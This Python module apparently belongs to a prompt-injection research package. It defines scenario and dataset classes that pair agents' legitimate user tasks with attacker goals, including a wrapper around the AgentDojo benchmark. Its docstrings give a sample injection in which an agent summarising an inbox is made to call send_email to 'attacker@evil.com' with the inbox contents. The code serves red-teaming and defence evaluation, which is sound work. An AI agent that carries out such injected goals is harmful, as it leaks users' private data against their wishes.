"""
IPI Dataset interface and implementations.

IPIDataset — abstract base class defining the standard interface for all IPI
             attack datasets used in this research package.

AgentDojoDataset — wraps the AgentDojo benchmark (Debenedetti et al. 2024).
                   AgentDojo provides diverse prompt-injection task suites across
                   multiple simulated environments (workspace, banking, slack, etc.).
                   Install: pip install agentdojo

ManualIPIDataset  — wraps an explicit list of IPIScenario dicts. Useful for custom
                    evaluation scenarios or quick one-off experiments.

IPIScenario fields
------------------
  id                  — unique identifier string
  user_task           — the agent's original legitimate task (what the user asked for)
  injection_goal      — the attacker's objective (what the injection should make the agent do)
  target_tool_calls   — expected tool call string if attack succeeds (for judge context)
  tool_schema         — description of tools available to the agent (for attacker context)
  pipeline_context    — any additional context the agent would have (e.g. prior messages)
  metadata            — free-form dict for benchmarking metadata

AgentDojo integration notes
---------------------------
  agentdojo is NOT installed on the server; import it in your notebook after
  ``pip install agentdojo``. The AgentDojoDataset class lazily imports agentdojo
  so the rest of the package loads even without it installed.

  Each AgentDojo TaskSuite maps to a set of injection tasks. We extract:
    user_task           ← the suite's user task string
    injection_goal      ← the injection task's goal
    target_tool_calls   ← the injection task's ground-truth tool call(s)
    tool_schema         ← tool names + descriptions from the suite environment
"""
from __future__ import annotations

import json
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Iterator, Optional


# ---------------------------------------------------------------------------
# IPIScenario
# ---------------------------------------------------------------------------

@dataclass
class IPIScenario:
    """
    A single Indirect Prompt Injection evaluation scenario.

    Attributes:
        id:               Unique scenario identifier (e.g. "agentdojo/workspace/s1").
        user_task:        The legitimate task the agent was asked to perform.
        injection_goal:   What the attacker wants the agent to do (attacker goal string).
        target_tool_calls:Expected tool call string for a successful attack.
                          Used in judge context and eval metrics.
                          Example: "send_email(to='evil@attacker.com')"
        tool_schema:      Human-readable description of available tools.
                          Used in attacker context to guide injection crafting.
        pipeline_context: Optional additional context the agent has at injection time
                          (e.g. conversation history, retrieved documents).
        metadata:         Free-form metadata dict (suite name, task type, etc.).
    """
    id:                str
    user_task:         str
    injection_goal:    str
    target_tool_calls: str = ""
    tool_schema:       str = ""
    pipeline_context:  str = ""
    metadata:          dict = field(default_factory=dict)

    def to_attack_context(self) -> dict:
        """
        Build the ``context`` dict expected by run_tap / run_pair / run_attack.

        Returns:
            dict with keys: user_task, tool_schema, target_tool_calls, conversation_history
        """
        return {
            "user_task":          self.user_task,
            "tool_schema":        self.tool_schema,
            "target_tool_calls":  self.target_tool_calls,
            "conversation_history": self.pipeline_context,
        }

    def to_experiment_scenario(self) -> dict:
        """
        Build a scenario dict compatible with run_experiment's ``scenarios`` list.

        Returns:
            dict with keys: id, goal, context
        """
        return {
            "id":      self.id,
            "goal":    self.injection_goal,
            "context": self.to_attack_context(),
        }


# ---------------------------------------------------------------------------
# IPIDataset (abstract base)
# ---------------------------------------------------------------------------

class IPIDataset(ABC):
    """
    Abstract base class for IPI attack datasets.

    Subclasses implement __len__, __iter__, and __getitem__. All other methods
    (subset, to_list, to_experiment_scenarios) are provided by this base class.
    """

    @abstractmethod
    def __len__(self) -> int:
        """Return the total number of scenarios."""

    @abstractmethod
    def __iter__(self) -> Iterator[IPIScenario]:
        """Iterate over all IPIScenario objects."""

    @abstractmethod
    def __getitem__(self, idx: int) -> IPIScenario:
        """Return scenario at index idx."""

    def subset(self, n: int, seed: int = 42) -> "ManualIPIDataset":
        """
        Return a random subset of n scenarios.

        Args:
            n:    Number of scenarios to include (capped at len(self)).
            seed: Random seed for reproducibility.

        Returns:
            ManualIPIDataset with n randomly selected scenarios.
        """
        import random
        rng = random.Random(seed)
        items = list(self)
        selected = rng.sample(items, min(n, len(items)))
        return ManualIPIDataset(selected)

    def to_list(self) -> list[IPIScenario]:
        """Return all scenarios as a plain list."""
        return list(self)

    def to_experiment_scenarios(self) -> list[dict]:
        """
        Convert all scenarios to run_experiment-compatible dicts.

        Returns:
            List of dicts with keys: id, goal, context.
        """
        return [s.to_experiment_scenario() for s in self]

    def __repr__(self) -> str:
        return f"{self.__class__.__name__}(n={len(self)})"


# ---------------------------------------------------------------------------
# ManualIPIDataset
# ---------------------------------------------------------------------------

class ManualIPIDataset(IPIDataset):
    """
    Dataset built from an explicit list of IPIScenario objects.

    Useful for:
      - Custom evaluation scenarios defined in code or loaded from a JSON file.
      - Subsets returned by IPIDataset.subset().
      - Quick one-off experiments.

    Args:
        scenarios: List of IPIScenario objects, OR list of dicts with the same
                   field names (will be converted automatically).

    Example:
        dataset = ManualIPIDataset([
            IPIScenario(
                id="email_exfil_1",
                user_task="Summarize my inbox",
                injection_goal="Call send_email(to='attacker@evil.com', body='<inbox contents>')",
                target_tool_calls="send_email(to='attacker@evil.com')",
                tool_schema="send_email(to, subject, body): Send an email.",
            ),
        ])
    """

    def __init__(self, scenarios: list):
        self._scenarios: list[IPIScenario] = []
        for s in scenarios:
            if isinstance(s, IPIScenario):
                self._scenarios.append(s)
            elif isinstance(s, dict):
                self._scenarios.append(IPIScenario(**s))
            else:
                raise TypeError(f"Expected IPIScenario or dict, got {type(s).__name__}")

    def __len__(self) -> int:
        return len(self._scenarios)

    def __iter__(self) -> Iterator[IPIScenario]:
        return iter(self._scenarios)

    def __getitem__(self, idx: int) -> IPIScenario:
        return self._scenarios[idx]

    @classmethod
    def from_json(cls, path: str) -> "ManualIPIDataset":
        """
        Load from a JSON file containing a list of scenario dicts.

        Args:
            path: Path to JSON file. Each element must have at least 'id',
                  'user_task', and 'injection_goal' keys.

        Returns:
            ManualIPIDataset loaded from the file.
        """
        with open(path) as f:
            data = json.load(f)
        return cls(data)

    def to_json(self, path: str) -> None:
        """Save all scenarios to a JSON file."""
        import dataclasses
        data = [dataclasses.asdict(s) for s in self._scenarios]
        with open(path, "w") as f:
            json.dump(data, f, indent=2)


# ---------------------------------------------------------------------------
# AgentDojoDataset
# ---------------------------------------------------------------------------

class AgentDojoDataset(IPIDataset):
    """
    IPI dataset wrapping the AgentDojo benchmark (Debenedetti et al. 2024).

    AgentDojo provides multi-environment task suites for evaluating agents
    against prompt injection. Each suite contains:
      - A set of user tasks (legitimate agent tasks)
      - A set of injection tasks (attacker objectives paired with ground-truth calls)
      - A simulated environment (tools, documents, prior state)

    This wrapper creates one IPIScenario for each (user_task, injection_task) pair
    in the selected suites.

    Install: pip install agentdojo

    Args:
        suite_names:    List of suite names to load. None = load all available suites.
                        Examples: ["workspace", "banking", "slack", "travel"]
        max_per_suite:  Maximum scenarios to take from each suite (None = all).
        include_tools:  If True, extract and include the tool schema in each scenario.

    Example:
        from ipi.dataset import AgentDojoDataset

        dataset = AgentDojoDataset(suite_names=["workspace"], max_per_suite=10)
        print(dataset[0])
        subset = dataset.subset(20)
        scenarios = subset.to_experiment_scenarios()
    """

    def __init__(
        self,
        suite_names: Optional[list[str]] = None,
        max_per_suite: Optional[int] = None,
        include_tools: bool = True,
        pair_all_user_tasks: bool = False,
    ):
        self._scenarios = self._load(suite_names, max_per_suite, include_tools, pair_all_user_tasks)

    # ------------------------------------------------------------------
    # Public constructor: import agentdojo yourself and pass the suite
    # ------------------------------------------------------------------

    @classmethod
    def from_suite(
        cls,
        suite,
        suite_name: str = "",
        max_scenarios: Optional[int] = None,
        include_tools: bool = True,
        pair_all_user_tasks: bool = False,
        skip_empty_targets: bool = False,
    ) -> "AgentDojoDataset":
        """
        Create an AgentDojoDataset from a pre-imported agentdojo TaskSuite.

        Example::

            from agentdojo.default_suites.v1.workspace import task_suite

            # 4 static injection tasks × 40 user tasks = 160 scenarios
            dataset = AgentDojoDataset.from_suite(
                task_suite, suite_name='workspace',
                pair_all_user_tasks=True,
                skip_empty_targets=True,   # drop tasks whose ground_truth needs live env
            )

        Args:
            suite:               An agentdojo TaskSuite instance.
            suite_name:          Name embedded in scenario IDs (e.g. ``"workspace"``).
            max_scenarios:       Cap on total scenarios extracted. None = all.
            include_tools:       Whether to extract and include the tool schema string.
            pair_all_user_tasks: Create one scenario per (injection_task × user_task)
                                 pair instead of only pairing with the first user task.
            skip_empty_targets:  Drop scenarios whose target_tool_calls could not be
                                 extracted (i.e. ground_truth() needs a live environment).
        """
        obj = cls.__new__(cls)
        scenarios = cls._extract_from_suite(
            suite, suite_name, max_scenarios, include_tools, pair_all_user_tasks
        )
        if skip_empty_targets:
            scenarios = [s for s in scenarios if s.target_tool_calls]
        obj._scenarios = scenarios
        return obj

    @classmethod
    def from_suites(
        cls,
        suites: dict,
        max_per_suite: Optional[int] = None,
        include_tools: bool = True,
        pair_all_user_tasks: bool = False,
        skip_empty_targets: bool = False,
    ) -> "AgentDojoDataset":
        """
        Create an AgentDojoDataset from multiple pre-imported suites.

        Example::

            from agentdojo.default_suites.v1.workspace import task_suite as ws
            from agentdojo.default_suites.v1.banking   import task_suite as bk

            dataset = AgentDojoDataset.from_suites(
                {'workspace': ws, 'banking': bk},
                pair_all_user_tasks=True,
                skip_empty_targets=True,
            )

        Args:
            suites:              Dict mapping suite_name -> TaskSuite instance.
            max_per_suite:       Cap per suite. None = all.
            include_tools:       Whether to include tool schema.
            pair_all_user_tasks: Create all (injection_task × user_task) pairs.
            skip_empty_targets:  Drop scenarios with empty target_tool_calls.
        """
        scenarios: list[IPIScenario] = []
        for suite_name, suite in suites.items():
            extracted = cls._extract_from_suite(
                suite, suite_name, max_per_suite, include_tools, pair_all_user_tasks
            )
            scenarios.extend(extracted)
        if skip_empty_targets:
            scenarios = [s for s in scenarios if s.target_tool_calls]
        obj = cls.__new__(cls)
        obj._scenarios = scenarios
        return obj

    # ------------------------------------------------------------------
    # Internal: suite → IPIScenario list
    # ------------------------------------------------------------------

    @staticmethod
    def _normalize_collection(collection) -> list[tuple[str, object]]:
        """
        Return a list of (task_id, task_obj) pairs from a dict or list.

        agentdojo stores tasks as either:
          dict[str, type[Task]]   — task_id → task class (most common)
          list[type[Task]]        — positional list
        Both are normalised here so downstream code never iterates dict keys.
        """
        if isinstance(collection, dict):
            return list(collection.items())
        return [(str(i), t) for i, t in enumerate(collection)]

    @staticmethod
    def _extract_from_suite(
        suite,
        suite_name: str,
        max_scenarios: Optional[int],
        include_tools: bool,
        pair_all_user_tasks: bool = False,
    ) -> list[IPIScenario]:
        """Convert one agentdojo TaskSuite into a list of IPIScenario objects."""
        inj_raw = getattr(suite, "injection_tasks", None) or {}
        usr_raw = getattr(suite, "user_tasks",      None) or {}

        inj_items = AgentDojoDataset._normalize_collection(inj_raw)
        usr_items = AgentDojoDataset._normalize_collection(usr_raw)

        tool_schema = AgentDojoDataset._extract_tool_schema(suite) if include_tools else ""
        env         = AgentDojoDataset._get_default_environment(suite)

        # Decide which user tasks to pair with each injection task
        if pair_all_user_tasks and usr_items:
            user_task_pairs = [
                (uid, AgentDojoDataset._extract_user_task(ut))
                for uid, ut in usr_items
            ]
        else:
            # Default: use only the first user task
            first_str = AgentDojoDataset._extract_user_task(usr_items[0][1]) if usr_items else ""
            user_task_pairs = [(usr_items[0][0] if usr_items else "u0", first_str)]

        scenarios: list[IPIScenario] = []
        for inj_id, injection_task in inj_items:
            if max_scenarios is not None and len(scenarios) >= max_scenarios:
                break
            goal         = AgentDojoDataset._extract_goal(injection_task)
            target_calls = AgentDojoDataset._extract_target_calls(injection_task, env)

            for usr_id, user_task_str in user_task_pairs:
                if max_scenarios is not None and len(scenarios) >= max_scenarios:
                    break
                # Include user task id in scenario id only when pairing multiple
                if pair_all_user_tasks:
                    sid = f"agentdojo/{suite_name}/{inj_id}/{usr_id}"
                else:
                    sid = f"agentdojo/{suite_name}/{inj_id}"
                scenarios.append(IPIScenario(
                    id=sid,
                    user_task=user_task_str,
                    injection_goal=goal,
                    target_tool_calls=target_calls,
                    tool_schema=tool_schema,
                    metadata={
                        "suite": suite_name,
                        "injection_task_id": inj_id,
                        "user_task_id": usr_id,
                    },
                ))

        return scenarios

    # ------------------------------------------------------------------
    # Auto-discovery constructor (AgentDojoDataset(...))
    # ------------------------------------------------------------------

    @staticmethod
    def _import_suites() -> dict:
        """
        Try multiple agentdojo API patterns to return a dict of suite objects.
        Raises ImportError with a detailed message if none work.
        """
        import importlib
        errors: list[str] = []

        # Pattern 1: agentdojo.default_suites.v1.<name> module (>= 0.2)
        try:
            suites: dict = {}
            for name in ("workspace", "banking", "slack", "travel"):
                try:
                    mod = importlib.import_module(f"agentdojo.default_suites.v1.{name}")
                    suite = (
                        getattr(mod, "task_suite", None)
                        or getattr(mod, f"{name}_task_suite", None)
                    )
                    if suite is not None:
                        suites[name] = suite
                except ImportError:
                    pass
            if suites:
                return suites
            errors.append("default_suites.v1.<name>: modules found but no task_suite attr")
        except Exception as e:
            errors.append(f"default_suites.v1: {e}")

        # Pattern 2: get_suites() helper function
        try:
            from agentdojo.task_suites import get_suites  # type: ignore[attr-defined]
            return get_suites()
        except (ImportError, AttributeError) as e:
            errors.append(f"task_suites.get_suites(): {e}")

        # Pattern 3: module-level registry dict
        for attr in ("TASK_SUITES", "REGISTERED_SUITES", "SUITES"):
            try:
                mod = importlib.import_module("agentdojo.task_suites")
                registry = getattr(mod, attr, None)
                if isinstance(registry, dict) and registry:
                    return registry
            except Exception as e:
                errors.append(f"task_suites.{attr}: {e}")

        raise ImportError(
            "agentdojo is installed but the suite registry API was not found.\n"
            "Tried:\n" + "\n".join(f"  - {e}" for e in errors) + "\n\n"
            "Use AgentDojoDataset.from_suite() instead:\n"
            "  from agentdojo.default_suites.v1.workspace import task_suite\n"
            "  dataset = AgentDojoDataset.from_suite(task_suite, 'workspace')"
        )

    @staticmethod
    def _load(
        suite_names: Optional[list[str]],
        max_per_suite: Optional[int],
        include_tools: bool,
        pair_all_user_tasks: bool = False,
    ) -> list[IPIScenario]:
        try:
            import agentdojo  # noqa: F401
        except ImportError as exc:
            raise ImportError(
                "agentdojo is required for AgentDojoDataset. "
                "Install it with: pip install agentdojo"
            ) from exc

        all_suites = AgentDojoDataset._import_suites()
        if suite_names is not None:
            all_suites = {k: v for k, v in all_suites.items() if k in suite_names}

        scenarios: list[IPIScenario] = []
        for suite_name, suite in all_suites.items():
            extracted = AgentDojoDataset._extract_from_suite(
                suite, suite_name, max_per_suite, include_tools, pair_all_user_tasks
            )
            scenarios.extend(extracted)

        return scenarios

    # ------------------------------------------------------------------
    # Static extraction helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _extract_goal(task) -> str:
        """Extract the attacker goal string from a task object or class."""
        # agentdojo uses ClassVar GOAL; also check lowercase variants
        for attr in ("GOAL", "goal", "injection_goal", "description"):
            val = getattr(task, attr, None)
            if val and isinstance(val, str):
                return val
        return str(task)

    @staticmethod
    def _get_default_environment(suite):
        """
        Return a default environment instance for the suite so we can call
        ground_truth(pre_environment) on each injection task.

        Tries in order:
          1. suite.environment  — already-instantiated env on the suite object
          2. suite.environment_type()  — instantiate the env class with no args
          3. None  — fall back silently; target_tool_calls will be empty
        """
        env = getattr(suite, "environment", None)
        if env is not None:
            return env
        env_type = getattr(suite, "environment_type", None)
        if env_type is not None:
            try:
                return env_type()
            except Exception:
                pass
        return None

    @staticmethod
    def _format_function_calls(calls: list) -> str:
        """Format a list of agentdojo FunctionCall objects as a readable string."""
        parts = []
        for call in calls:
            if hasattr(call, "function") and hasattr(call, "args"):
                args_str = ", ".join(
                    f"{k}={v!r}" for k, v in (call.args or {}).items()
                )
                parts.append(f"{call.function}({args_str})")
            else:
                parts.append(str(call))
        return "; ".join(parts)

    @staticmethod
    def _extract_target_calls(task, env=None) -> str:
        """
        Extract expected tool calls from the task's ground_truth.

        agentdojo tasks define ground_truth as an instance method:
            def ground_truth(self, pre_environment) -> list[FunctionCall]

        Many tasks ignore the environment argument (static goals like
        "delete file id 13"), so we can call ground_truth(None) and it works.
        Tasks that actually read from the environment (e.g. tasks 3, 5 which
        need live email content) will raise an exception — we catch it and
        return "" for those.
        """
        gt_attr = getattr(task, "ground_truth", None)
        if gt_attr is None:
            return ""

        # Static: already a plain string or list of FunctionCall objects
        if isinstance(gt_attr, str):
            return gt_attr
        if isinstance(gt_attr, list):
            return AgentDojoDataset._format_function_calls(gt_attr)

        # Callable method — task instances are stored directly in the dict,
        # so no need to instantiate. Pass env (may be None); tasks that don't
        # access the environment work fine with None.
        if callable(gt_attr):
            try:
                task_instance = task() if isinstance(task, type) else task
                result = task_instance.ground_truth(env)
                if isinstance(result, list):
                    return AgentDojoDataset._format_function_calls(result)
                if isinstance(result, str):
                    return result
            except Exception:
                pass  # task reads from env (e.g. email body) — skip gracefully

        return ""

    @staticmethod
    def _extract_user_task(task) -> str:
        """Extract the task string from a user-task object or class."""
        # AgentDojo stores the instruction in PROMPT (ClassVar[str])
        for attr in ("PROMPT", "TASK", "DESCRIPTION", "prompt", "task", "user_task", "description"):
            val = getattr(task, attr, None)
            if isinstance(val, str) and val:
                return val
        return str(task)

    @staticmethod
    def _extract_tool_schema(suite) -> str:
        """Extract a human-readable tool schema from the suite.

        AgentDojo TaskSuite exposes tools directly via suite.tools.
        Falls back to suite.environment.tools for other suite shapes.
        Includes parameter signatures when available (Pydantic model_fields).
        """
        try:
            # Primary: AgentDojo stores tools directly on the suite object
            tools = getattr(suite, "tools", None)
            if not tools:
                # Fallback: some suite shapes nest tools under environment
                env = getattr(suite, "environment", None) or getattr(suite, "env", None)
                tools = getattr(env, "tools", None) or getattr(env, "available_tools", None)
            if not tools:
                return ""

            lines = []
            for tool in tools:
                name = getattr(tool, "name", str(tool))
                desc = getattr(tool, "description", "")
                # Include parameter names when available (Pydantic v1 or v2)
                schema = getattr(tool, "parameters", None)
                params: list[str] = []
                if schema is not None:
                    if hasattr(schema, "model_fields"):      # pydantic v2
                        params = list(schema.model_fields.keys())
                    elif hasattr(schema, "__fields__"):      # pydantic v1
                        params = list(schema.__fields__.keys())
                signature = f"{name}({', '.join(params)})" if params else name
                lines.append(f"{signature}: {desc}")
            return "\n".join(lines)
        except Exception:
            return ""

    def __len__(self) -> int:
        return len(self._scenarios)

    def __iter__(self) -> Iterator[IPIScenario]:
        return iter(self._scenarios)

    def __getitem__(self, idx: int) -> IPIScenario:
        return self._scenarios[idx]
